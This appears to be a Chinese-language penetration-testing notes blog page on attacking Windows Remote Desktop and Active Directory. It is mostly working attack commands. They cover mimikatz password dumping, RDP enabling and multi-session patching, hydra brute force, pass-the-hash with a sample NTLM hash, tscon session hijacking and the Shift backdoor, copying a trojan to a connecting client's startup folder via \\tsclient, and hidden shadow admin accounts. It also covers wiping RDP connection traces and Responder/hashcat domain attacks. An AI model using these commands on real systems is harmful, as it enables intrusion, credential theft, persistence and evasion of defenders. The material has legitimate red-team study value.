<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug      &#x2F;&#x2F; 提升至debug权限</span><br><span class="line">sekurlsa::logonpasswords       &#x2F;&#x2F; 抓取密码</span><br></pre></td></tr></table></figure>

<h3 id="Linux明文登录"><a href="#Linux明文登录" class="headerlink" title="Linux明文登录"></a>Linux明文登录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop ip:port</span><br></pre></td></tr></table></figure>

<h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621201013729.png)</p>
<hr>
<p>上面其实简单来说都是针对支持RDP的Windows server 操作系统的。还有Windows 7、8这些 没有server的。rdp服务如何开启？</p>
<h2 id="Windows-Server-03"><a href="#Windows-Server-03" class="headerlink" title="Windows Server 03"></a>Windows Server 03</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">开启：</span><br><span class="line">REG ADD \<span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span></span><br><span class="line"><span class="string">关闭：</span></span><br><span class="line"><span class="string">REG ADD \&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\&quot; /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span></span><br><span class="line"><span class="string">开启：</span></span><br><span class="line"><span class="string">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span></span><br><span class="line"><span class="string">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot;</span> <span class="string">&quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span></span><br><span class="line"><span class="string">REG ADD &quot;</span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server<span class="string">&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span></span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !&#x3D; &quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure>



<h2 id="Windows-Xp"><a href="#Windows-Xp" class="headerlink" title="Windows Xp"></a>Windows Xp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !&#x3D; &quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure>

<h2 id="Windows-8"><a href="#Windows-8" class="headerlink" title="Windows 8"></a>Windows 8</h2><p>三条命令即可：</p>
<ol>
<li>wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != “”) call setallowtsconnections 1</li>
<li>wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =’RDP-Tcp’) call setuserauthenticationrequired 1</li>
<li>reg add “HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</li>
</ol>
<p>或者reg</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f</span><br></pre></td></tr></table></figure>



<h2 id="Windows-2012"><a href="#Windows-2012" class="headerlink" title="Windows 2012"></a>Windows 2012</h2><p>通用</p>
<h2 id="Windows-7"><a href="#Windows-7" class="headerlink" title="Windows 7"></a>Windows 7</h2><ol>
<li>wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != “”) call setallowtsconnections 1</li>
<li>wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =’RDP-Tcp’) call setuserauthenticationrequired 1</li>
</ol>
<p>以上前提条件是确保Windows Management Instrumentation（Winmgmt）服务已正常启动，权限为管理员权限。</p>
<h2 id="Windows-2016"><a href="#Windows-2016" class="headerlink" title="Windows 2016"></a>Windows 2016</h2><p>Server 2016 默认远程桌面连接数是 2 个用户，如果多余两个用户进行远程桌面连接时，系统就会提示超过连接数</p>
<p>使用powershell,</p>
<p>设置 fDenyTSConnections 为0，允许Terminal Services。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;HKLM:SystemCurrentControlSetControlTerminal Server&#x27;</span> <span class="literal">-Name</span> <span class="string">&#x27;fDenyTSConnections&#x27;</span> <span class="literal">-Value</span> <span class="number">0</span> <span class="literal">-PropertyType</span> dword <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>

<p>开启用户验证，推荐默认开启，但是作为渗透测试的话，应该是可以不用的</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;HKLM:SystemCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp&#x27;</span> <span class="literal">-Name</span> <span class="string">&#x27;UserAuthentication&#x27;</span> <span class="literal">-Value</span> <span class="number">1</span> <span class="literal">-PropertyType</span> dword <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>

<p>添加防火墙规则</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Enable-NetFirewallRule</span> <span class="literal">-DisplayGroup</span> <span class="string">&#x27;Remote Desktop&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Enable Remote Desktop</span></span><br><span class="line">(<span class="built_in">Get-WmiObject</span> Win32_TerminalServiceSetting <span class="literal">-Namespace</span> root\cimv2\TerminalServices).SetAllowTsConnections(<span class="number">1</span>,<span class="number">1</span>) | <span class="built_in">Out-Null</span></span><br><span class="line">(<span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> <span class="string">&quot;Win32_TSGeneralSetting&quot;</span> <span class="literal">-Namespace</span> root\cimv2\TerminalServices <span class="literal">-Filter</span> <span class="string">&quot;TerminalName=&#x27;RDP-tcp&#x27;&quot;</span>).SetUserAuthenticationRequired(<span class="number">0</span>) | <span class="built_in">Out-Null</span></span><br><span class="line"><span class="built_in">Get-NetFirewallRule</span> <span class="literal">-DisplayName</span> <span class="string">&quot;Remote Desktop*&quot;</span> | <span class="built_in">Set-NetFirewallRule</span> <span class="literal">-enabled</span> true</span><br></pre></td></tr></table></figure>

<h2 id="Windows-Server-2019"><a href="#Windows-Server-2019" class="headerlink" title="Windows Server 2019"></a>Windows Server 2019</h2><p>开启RDP服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path &#39;HKLM:\System\CurrentControlSet\Control\Terminal Server&#39; -name &quot;fDenyTSConnections&quot; -value 0</span><br></pre></td></tr></table></figure>

<p>添加防火墙规则允许RDP</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-NetFirewallRule -DisplayGroup &quot;Remote Desktop&quot;</span><br></pre></td></tr></table></figure>



<h2 id="非服务器版本的Windows系统支持多用户登录的方法"><a href="#非服务器版本的Windows系统支持多用户登录的方法" class="headerlink" title="非服务器版本的Windows系统支持多用户登录的方法"></a>非服务器版本的Windows系统支持多用户登录的方法</h2><p>主要是3gstudent 师傅博客的思路，</p>
<blockquote>
<p>非服务器版本的Windows系统默认只允许一个账户登录</p>
</blockquote>
<p>具体表现为：</p>
<ul>
<li>远程登录时，使用与原系统相同的账户，原系统将被切换到登录界面</li>
<li>使用不同的账户，登录时提示其他用户已登录到此计算机</li>
<li>选择继续后，原系统桌面将弹框提示是否断开当前连接(30秒后默认选择同意，退回到登录界面)</li>
</ul>
<h3 id="1-使用mimikatz"><a href="#1-使用mimikatz" class="headerlink" title="1. 使用mimikatz"></a>1. 使用mimikatz</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">ts::multirdp</span><br></pre></td></tr></table></figure>

<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622161621291.png)</p>
<p>开启多用户登录功能，最高支持到Win7</p>
<p><strong>使用与原系统相同的账户，原系统还是会被切换到登录界面</strong></p>
<p>使用与原系统不同的账户，登录成功。</p>
<h3 id="2-修改termsrv-dll"><a href="#2-修改termsrv-dll" class="headerlink" title="2. 修改termsrv.dll"></a>2. 修改termsrv.dll</h3><p>原理：Windows在开启服务Remote Desktop Services时，会加载termsrv.dl</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622161930740.png)</p>
<p>通过修改内存中的termsrv.dll实现开启多用户功能</p>
<p>不进一步深入了，技术水平还有限。</p>
<h3 id="3-使用rdpwrap"><a href="#3-使用rdpwrap" class="headerlink" title="3. 使用rdpwrap"></a>3. 使用rdpwrap</h3><p>当个jb小子比较适合我，所以看第三种方法，使用rdpwrap这个工具。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/stascorp/rdpwrap">https://github.com/stascorp/rdpwrap</a></p>
<p>C# 版本：<a target="_blank" rel="noopener" href="https://github.com/infosecn1nja/SharpDoor">https://github.com/infosecn1nja/SharpDoor</a></p>
<blockquote>
<p>SharpDoor is alternative RDPWrap written in C# to allowed multiple RDP (Remote Desktop) sessions by patching termsrv.dll file, for opsec considerations SharpDoor still using cmd.exe to run sc services to impersonating as trustedinstaller in the future will be avoiding cmd.exe usage, currently <strong>only support for Windows 10.</strong></p>
</blockquote>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622162436228.png)</p>
<p>RDP Wrapper works as a layer between Service Control Manager and Terminal Services, so the original termsrv.dll file remains untouched. Also this method is very strong against Windows Update.</p>
<p>不修改termsrv.dll，通过传入不同参数实现</p>
<p>安装：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RDPWInst.exe -i is</span><br></pre></td></tr></table></figure>

<p>释放rdpwrap.dll和rdpwrap.ini至System32文件夹</p>
<p>rdpwrap.dll会被加载到同termsrv.dll相同的进程</p>
<p>此时，能够使用不同用户进行远程连接</p>
<p>卸载：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RDPWInst.exe -u</span><br></pre></td></tr></table></figure>

<h2 id="确定RDP有效用户名"><a href="#确定RDP有效用户名" class="headerlink" title="确定RDP有效用户名"></a>确定RDP有效用户名</h2><h3 id="明文密码"><a href="#明文密码" class="headerlink" title="明文密码"></a>明文密码</h3><h4 id="RDP暴破"><a href="#RDP暴破" class="headerlink" title="RDP暴破"></a>RDP暴破</h4><p>超级弱口令（🐶）</p>
<p>Lodon <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a></p>
<p>Goby</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622211811732.png)</p>
<p>Hydra</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 192.168.1.2 rdp -L user.txt -P pass.txt -V</span><br></pre></td></tr></table></figure>

<h4 id="SMB爆破"><a href="#SMB爆破" class="headerlink" title="SMB爆破"></a>SMB爆破</h4><p>msf</p>
<p>auxiliary/scanner/smb/smb_login</p>
<p>Ladon</p>
<p><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a></p>
<p>Goby</p>
<p>不过这种暴破的，操作，太嚣张了，推荐凌晨的时候搞。</p>
<h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h3><p>Impacket工具包中的rdp_check.py 脚本可以通过hash确定目标机器是否存在枚举的用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">usage: rdp_check.py [-h] [-hashes LMHASH:NTHASH] target</span><br><span class="line"></span><br><span class="line">Test whether an account is valid on the target host using the RDP protocol.</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  target                [[domain&#x2F;]username[:password]@]&lt;targetName or address&gt;</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line"></span><br><span class="line">authentication:</span><br><span class="line">  -hashes LMHASH:NTHASH</span><br><span class="line">                        NTLM hashes, format is LMHASH:NTHASH</span><br></pre></td></tr></table></figure>

<p>python rdp_check.py ./administrator@10.97.45.11 -hashes :618B18AD4171A53695DD997AB02D55C4</p>
<h2 id="RDP-权限维持"><a href="#RDP-权限维持" class="headerlink" title="RDP 权限维持"></a>RDP 权限维持</h2><p>原文地址：<a target="_blank" rel="noopener" href="http://t3ngyu.leanote.com/post/LM-RDP">http://t3ngyu.leanote.com/post/LM-RDP</a></p>
<h3 id="1-关闭RDP-安全认证"><a href="#1-关闭RDP-安全认证" class="headerlink" title="1. 关闭RDP 安全认证"></a>1. 关闭RDP 安全认证</h3><p>​    当服务器开启安全认证时，必须先通过登陆密码才能进入远程桌面；如果服务端用的是不安全的认证方式，即可以先远程链接后登陆可以触发Shift后门</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622165057305.png)</p>
<p>如何设置不安全的连接，去掉”仅允许使用网络级别的身份验证的远程桌面的计算机连接”选项，需要注意的是<strong>先上系统后验证也会在计算机本地留下一定的进程、日志。</strong></p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622165215060.png)</p>
<h3 id="2-Shift后门-RDP-Session-劫持"><a href="#2-Shift后门-RDP-Session-劫持" class="headerlink" title="2. Shift后门 + RDP Session 劫持"></a>2. Shift后门 + RDP Session 劫持</h3><p>要用到的工具，tscon，微软自带。</p>
<p>配合上面的关闭RDP安全认证方式，利用<strong>Shift后门可以让攻击者快速获得System权限</strong>，结合RDP劫持可以实现无需创建用户、不更改劫持用户登录时间、解锁劫持用户界面、等功能。注意<strong>RDP劫持需要System权限</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tscon id # (要劫持的用户id，query user查看)</span><br></pre></td></tr></table></figure>

<p>另外一种方法可以通过创建服务激活：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc create rdpjack binpath&#x3D;&quot;cmd.exe &#x2F;k tscon 2 &#x2F;dest:console&quot;</span><br><span class="line">net start radjack # 执行后切换到目标界面下</span><br></pre></td></tr></table></figure>

<p>Mimikatz中也有相关的利用模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">ts::sessions</span><br><span class="line">ts::remote &#x2F;id:1</span><br><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">ts::remote &#x2F;id:1</span><br></pre></td></tr></table></figure>

<p>RDP劫持经常应用到如下场景：</p>
<blockquote>
<p>（1）需要获取目标界面信息，如：mssql客户端连接数据库</p>
<p>（2）切换域用户身份，域内提权。如：域管账号登录在当前机器，抓密码的方式均被拦截可以考虑该方式</p>
<p>（3）绕过安全防护。如：之前遇到的一个奇葩环境，System权限使用prodump被AV拦截，但是切换到管理员权限可以正常dump……</p>
</blockquote>
<h2 id="RDP-服务器反打客户端"><a href="#RDP-服务器反打客户端" class="headerlink" title="RDP 服务器反打客户端"></a>RDP 服务器反打客户端</h2><blockquote>
<p> 需要客户端RDP链接时，开启磁盘共享（将本地磁盘挂在到服务器上）才能正常利用</p>
</blockquote>
<p>手动利用过程：假设客户端和登录服务器的用户都是Administrator</p>
<p>​    （1）在服务器端设置Administrator 启动项目，<code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\powershell.vbs</code> 作用是无弹窗执行bat脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set ws&#x3D;WScript.CreateObject(&quot;WScript.Shell&quot;)ws.Run &quot;C:\Windows.bat&quot;,0ws.Run &quot;cmd &#x2F;c del C:\Windows\Temp\service.exe&quot;,0</span><br></pre></td></tr></table></figure>

<p>​    （2）Windows.bat 脚本内容实现马（service.exe）拷贝到客户端的<strong>启动目录</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy &quot;C:\Windows\Temp\service.exe&quot; &quot;\\tsclient\c\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup\service.exe&quot;</span><br></pre></td></tr></table></figure>

<p>也可以根据实际情况，将Rat拷贝到客户端的其他目录，将激活脚本拷贝到客户端启动目录；</p>
<p>如果不出网的情况下，也可以将exe替换成要执行的脚本 。</p>
<p>利用工具：<a target="_blank" rel="noopener" href="https://github.com/mdsecactivebreach/RDPInception">https://github.com/mdsecactivebreach/RDPInception</a></p>
<ol>
<li>Modify batch file to execute PowerShell stager, EXE or even DLL.</li>
<li>Upload to the target, execute.</li>
</ol>
<h2 id="开启RDP影子用户"><a href="#开启RDP影子用户" class="headerlink" title="开启RDP影子用户"></a>开启RDP影子用户</h2><p>在Windows中，添加账户名后面加入<code>$</code>符合可以使该用户在命令行中隐藏</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622213958809.png)</p>
<p>net user 是看不到的，但是确实存在。</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622214055156.png)</p>
<p>将影子用户添加到管理员组：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators nb666$ /add</span><br></pre></td></tr></table></figure>



<p>这点隐藏完全不够，Windows用户的登录界面，会显示所有可以登录的用户。</p>
<h3 id="影子用户隐藏登录界面"><a href="#影子用户隐藏登录界面" class="headerlink" title="影子用户隐藏登录界面"></a>影子用户隐藏登录界面</h3><p>方法：更改注册表，克隆账号。</p>
<p>启动cmd，然后输入<code>regedit</code>，打开注册表。</p>
<p>找到 <code>HEKY_LOCAL_MACHINE\SAM\SAM\Domains\Account\User</code>，而默认情况下<code>SAM</code>键值只能由<strong>system</strong>权限进行修改</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622215055478.png)</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622215118852.png)</p>
<p>导出注册表，并修改F值</p>
<p><img src="https://hackergu.com/wp-content/uploads/2020/03/618b2d75da1ba69.png"></p>
<p><img src="https://hackergu.com/wp-content/uploads/2020/03/b870c2bf89419b0.png" alt="img"></p>
<p>然后替换F值，删除之前创建的影子用户即可。</p>
<p>具体操作看谷师傅的博客：<a target="_blank" rel="noopener" href="https://hackergu.com/power-shadowuser/">https://hackergu.com/power-shadowuser/</a></p>
<p>用户克隆的注意事项：</p>
<blockquote>
<p>我们以<code>test$</code>身份登录，但是登陆之后的身份却是<code>WIN7</code>用户，桌面也是<code>WIN7</code>用户的，达到克隆效果。所以，在实际操作时，要小心在桌面的操作，以防被发现。</p>
<p>进行操作的时候，不要使用域用户进行操作，该操作只适用于本地用户。利用的局限性比较大，只有在登录远程桌面并且权限较大时才可以精确利用。</p>
</blockquote>
<h2 id="RDP-连接痕迹清除"><a href="#RDP-连接痕迹清除" class="headerlink" title="RDP 连接痕迹清除"></a>RDP 连接痕迹清除</h2><blockquote>
<p>利用”跳板”主机连接许多内网IP地址的3389 在渗透结束时清除”脚印” 3389连接记录也是必清除项目之一</p>
</blockquote>
<p>运行regedit</p>
<p>找到<code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default</code> 设置为不可改写，即不会留记录。</p>
<p>如下，</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622221409318.png)</p>
<p>这里也可以导出RDP的连接记录。</p>
<p>通过以下命令枚举指定注册表项下所有的的子项，即当前用户所连接过的所有的主机名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir &quot;Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; -Name</span><br></pre></td></tr></table></figure>



<p>然后使用以下命令查询指定注册表项的注册表键值，即查看连接所使用的用户名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Get-ItemProperty -Path &quot;Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\1.xxx.xxx.xxx&quot;).UsernameHint</span><br></pre></td></tr></table></figure>

<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622222847702.png)</p>
<p>并且在运行mstsc.exe ，连接框中也会有连接过的ip/域名。</p>
<p>这个信息储存在“我的文档”下的“Default.rdp”文件中，删掉就可以了。</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622221553138.png)</p>
<h2 id="CVE-2019-0708-BlueKeep"><a href="#CVE-2019-0708-BlueKeep" class="headerlink" title="CVE-2019-0708(BlueKeep)"></a>CVE-2019-0708(BlueKeep)</h2><p>2019 年 5 月 14 日微软官方发布安全补丁，修复了 Windows 远程桌面服务的远程代码执行漏洞（CVE-2019-0708），该高危漏洞利用方式是通过远程桌面端口 3389，RDP 协议进行攻击的。</p>
<p>此漏洞是预身份验证且无需用户交互，这就意味着这个漏洞可以通过网络蠕虫的方式被利用。利用此漏洞的任何恶意软件都可能从被感染的计算机传播到其他易受攻击的计算机，其方式与 2017 年 WannaCry 恶意软件的传播方式类似。</p>
<p>它影响了某些旧版本的 Windows 系统，包括：</p>
<blockquote>
<p>Windows 7 foR 32-bit Systems Service Pack 1</p>
<p>Windows 7 for x64-based Systems Service Pack 1</p>
<p>Windows Server 2008 foR 32-bit Systems Service Pack 2</p>
<p>Windows Server 2008 foR 32-bit Systems Service Pack 2 (Server Core installation)</p>
<p>Windows Server 2008 for Itanium-Based Systems Service Pack 2</p>
<p>Windows Server 2008 for x64-based Systems Service Pack 2</p>
<p>Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)</p>
<p>Windows Server 2008 R2 for Itanium-Based Systems Service Pack 1</p>
<p>Windows Server 2008 R2 for x64-based Systems Service Pack 1</p>
<p>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</p>
<p>Windows XP SP3 x86</p>
<p>Windows XP Professional x64 Edition SP2</p>
<p>Windows XP Embedded SP3 x86</p>
<p>Windows Server 2003 SP2 x86</p>
<p>Windows Server 2003 x64 Edition SP2</p>
</blockquote>
<p>Windows 8 和 Windows 10 及之后版本的用户不受此漏洞的影响。</p>
<p><strong>实战还没成功过</strong>。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/93496.htm">https://www.jb51.net/article/93496.htm</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/seaskying/article/details/9361181">https://blog.csdn.net/seaskying/article/details/9361181</a></p>
<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95</a></p>
<p><a target="_blank" rel="noopener" href="https://pythonpig.github.io/2016/12/21/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9F%A5%E8%AF%86%E6%B1%87%E6%80%BB/">https://pythonpig.github.io/2016/12/21/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9F%A5%E8%AF%86%E6%B1%87%E6%80%BB/</a></p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows-server/remote/remote-desktop-services/clients/remote-desktop-supported-config">https://docs.microsoft.com/zh-cn/windows-server/remote/remote-desktop-services/clients/remote-desktop-supported-config</a></p>
<p><a target="_blank" rel="noopener" href="http://t3ngyu.leanote.com/post/LM-RDP">http://t3ngyu.leanote.com/post/LM-RDP</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mujj/articles/3065895.html">https://www.cnblogs.com/mujj/articles/3065895.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.tomshardware.com/reviews/enable-remote-desktop-in-windows-server-2016,5592.html">https://www.tomshardware.com/reviews/enable-remote-desktop-in-windows-server-2016,5592.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.yowko.com/windows-server-2016-enable-remote-desktop/#%E4%BD%BF%E7%94%A8-powershell">https://blog.yowko.com/windows-server-2016-enable-remote-desktop/#%E4%BD%BF%E7%94%A8-powershell</a></p>
<p><a target="_blank" rel="noopener" href="https://www.rootusers.com/how-to-enable-remote-desktop-in-windows-server-2019/">https://www.rootusers.com/how-to-enable-remote-desktop-in-windows-server-2019/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/06/26/windows%E6%B8%97%E9%80%8F%E4%B8%AD%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/">https://www.k0rz3n.com/2018/06/26/windows%E6%B8%97%E9%80%8F%E4%B8%AD%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/</a></p>
<p><a target="_blank" rel="noopener" href="https://hackergu.com/power-shadowuser/">https://hackergu.com/power-shadowuser/</a></p>
<p><a target="_blank" rel="noopener" href="http://www.91ri.org/2234.html">http://www.91ri.org/2234.html</a></p>
<h1 id="域外寻找域控思路"><a href="#域外寻找域控思路" class="headerlink" title="域外寻找域控思路"></a>域外寻找域控思路</h1><p>主要是端口扫描。</p>
<h2 id="扫描内网中同时开放389和53端口的机器、88和389端口"><a href="#扫描内网中同时开放389和53端口的机器、88和389端口" class="headerlink" title="扫描内网中同时开放389和53端口的机器、88和389端口"></a>扫描内网中同时开放389和53端口的机器、88和389端口</h2><p>端口：389<br>服务：LDAP、ILS<br>说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。</p>
<p>端口：53<br>服务：Domain Name Server（DNS）<br>说明：53端口为DNS(Domain Name Server，域名服务器)服务器所开放，主要用于域名解析，DNS服务在NT系统中使用的最为广泛。通过DNS服务器可以实现域名与IP地址之间的转换，只要记住域名就可以快速访问网站。</p>
<p>端口：88</p>
<p>服务：88/UDP（用户数据报协议）– Kerberos</p>
<p>Kerberos 协议是一种基于密钥分发模型的网络身份验证方法。该协议使在网络上进行通信的实体能够证明彼此的身份，同时该协议可以阻止窃听或重放攻击。 Kerberos 密钥分发中心 (KDC) 在该端口上侦听票证请求。Kerberos 协议的 88 端口也可以是 TCP/UDP。</p>
<p>外网使用该功能需要将服务端机器的查帐端口2531映射到外网。</p>
<h1 id="域外如何打域控"><a href="#域外如何打域控" class="headerlink" title="域外如何打域控"></a>域外如何打域控</h1><h2 id="不知道是什么方法的方法"><a href="#不知道是什么方法的方法" class="headerlink" title="不知道是什么方法的方法"></a>不知道是什么方法的方法</h2><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/news/140493">https://cloud.tencent.com/developer/news/140493</a></p>
<p>Responder 抓到一台域内机器的Net-NTLM v2 Hash ，CME 检查NetBIOS，确定是否和用户对应，hashcat 破解Net-NTLM v2 Hash，获取到 SAM 文件存储的NTLM Hash，pth &amp; psexec。</p>
